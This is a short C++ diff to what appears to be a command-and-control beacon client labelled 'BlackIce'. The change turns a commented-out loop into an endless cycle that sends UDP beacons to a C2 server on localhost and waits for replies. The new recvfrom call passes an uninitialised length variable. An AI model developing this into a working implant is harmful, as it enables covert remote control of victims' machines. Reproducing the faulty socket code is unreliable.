@@ -11,6 +11,7 @@
 #include "udp_frag_generated.h"
 
 #define MAX_UDP_FRAG_SIZE 1000
+#define BUFF_SIZE 2000
 
 using anomaly::APIT;
 
@@ -87,8 +88,9 @@ void SendUdpBeacon(int sock, sockaddr_in serverAddr, APIT beacon) {
 int main() {
     std::cout << "BlackIce Test" << std::endl;
 
-    int sock, ret;
+    int sock, ret, len;
     struct sockaddr_in servAddr;
+    char buff[BUFF_SIZE];
 
     // Initialize C2 Server Info
     std::string server = "127.0.0.1";
@@ -110,10 +112,13 @@ int main() {
     // Create Initialization Beacon
     APIT beacon = InitBeacon(server);
 
-    //do {
+    do {
         SendUdpBeacon(sock, servAddr, std::move(beacon));
 
-    //} while(1);
+        ret = recvfrom(sock, (char *) buff, BUFF_SIZE, MSG_WAITALL, (struct sockaddr *) &servAddr, (socklen_t *) &len);
+        std::cout << "Received packet." << std::endl;
+
+    } while(1);
 
     return 0;
 }
